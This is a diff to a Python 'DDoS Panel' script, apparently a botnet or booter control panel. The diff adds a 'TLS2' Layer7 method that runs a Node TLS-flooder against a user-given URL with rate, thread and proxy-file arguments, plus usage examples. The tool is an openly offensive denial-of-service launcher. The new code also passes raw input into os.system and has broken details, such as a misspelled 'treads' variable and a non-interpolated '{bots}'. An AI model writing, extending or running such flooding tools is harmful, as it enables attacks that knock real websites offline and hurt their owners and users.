@@ -16,7 +16,7 @@ import sys
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
 
-proxy = open('proxy.txt').readlines()
+proxy = open('text1.txt').readlines()
 bots = len(proxy)
 
 def lod():
@@ -25,6 +25,7 @@ def lod():
 def atas():
 	print(' Its | Wellcome To Its DDoS Panel | Owner By: Lintar ')
 	print('                      Botnets that we have : {bots}                      ')
+	print('                         ProxyFile Name : text1.txt                         ')
 	print("")
 
 def logo():
@@ -47,6 +48,7 @@ def methods():
 	clear()
 	print("""
 » Layer7: 
+	TLS2 <url> <time> <Rate> <threads> <proxyfile>
 	SPIKE <target> <threads> <time>
 	TLS <url> <time> <Rate> <threads>
 	HTTP <url> <req_per_ip> <time>
@@ -88,6 +90,18 @@ def main():
             except IndexError:
                 print('Usage: UAMBYPASS <url> <time> <ConnectPerThread> <proxies> <thread>')
                 print('Example: UAMBYPASS <http://example.com> <60> <250> <proxy.txt> <1>')
+
+        elif "TLS2" in cnc:
+            try:
+                target = cnc.split()[1]
+                time = cnc.split()[2]
+                Rate = cnc.split()[3]
+                treads = cnc.split()[4]
+                proxyFile = cnc.split()[5]
+                os.system(f'node TLS-FLOODER.js {target} {time} {Rate} {threads} {proxyFile}')
+            except IndexError:
+                print('Usage: TLS2 <url> <time> <Rate> <threads> <proxyfile>')
+                print('Example: TLS2 <https://EXAMPLE .com 120 512 1000 text1.txt')
 
         elif "SPIKE" in cnc:
             try:
